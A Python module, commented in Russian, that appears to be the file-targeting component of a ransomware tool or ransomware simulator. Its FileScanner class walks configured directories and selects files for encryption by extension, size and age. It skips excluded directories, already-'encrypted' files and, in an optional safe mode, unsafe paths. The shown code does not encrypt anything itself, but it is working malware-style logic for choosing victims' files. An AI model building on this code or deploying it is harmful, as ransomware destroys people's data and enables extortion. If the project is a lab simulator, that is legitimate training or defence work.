import os
from pathlib import Path
from typing import List, Generator
import time
from datetime import datetime, timedelta
from .config import Config
from .utils import get_file_info, is_safe_path

class FileScanner:
    """Сканер файлов для шифрования"""
    
    def __init__(self, config: Config):
        self.config = config
        self.scanned_files = 0
        self.target_files = []
    
    def scan(self) -> List[Path]:
        """Сканирование целевых директорий"""
        self.target_files = []
        
        for target_dir in self.config.target_dirs:
            if not os.path.exists(target_dir):
                print(f"[!] Директория не существует: {target_dir}")
                continue
            
            print(f"[*] Сканирование: {target_dir}")
            for file_path in self._walk_directory(target_dir):
                if self._should_encrypt(file_path):
                    self.target_files.append(file_path)
        
        print(f"[+] Найдено целевых файлов: {len(self.target_files)}")
        return self.target_files
    
    def _walk_directory(self, directory: str) -> Generator[Path, None, None]:
        """Обход директории с защитой от симлинков"""
        try:
            for root, dirs, files in os.walk(directory):
                # Пропускаем исключённые директории
                dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d))]
                
                for file in files:
                    full_path = Path(root) / file
                    yield full_path
        except PermissionError:
            print(f"[!] Нет доступа к директории: {directory}")
        except Exception as e:
            print(f"[!] Ошибка при обходе {directory}: {e}")
    
    def _should_encrypt(self, file_path: Path) -> bool:
        """Проверка, нужно ли шифровать файл"""
        self.scanned_files += 1
        
        # Проверка расширения
        if file_path.suffix.lower() not in self.config.target_extensions:
            return False
        
        # Проверка размера
        try:
            size_mb = file_path.stat().st_size / (1024 * 1024)
            if size_mb > self.config.max_file_size_mb:
                return False
        except:
            return False
        
        # Проверка даты создания
        if self.config.min_file_age_days > 0:
            try:
                file_age = time.time() - file_path.stat().st_mtime
                if file_age < self.config.min_file_age_days * 86400:
                    return False
            except:
                pass
        
        # Проверка безопасности пути
        if self.config.safe_mode and not is_safe_path(file_path):
            return False
        
        # Игнорируем уже "зашифрованные" файлы
        if file_path.suffix == self.config.encrypted_extension:
            return False
        
        return True
    
    def _is_excluded(self, path: str) -> bool:
        """Проверка исключённых директорий"""
        for excluded in self.config.excluded_dirs:
            if path.startswith(excluded):
                return True
        return False
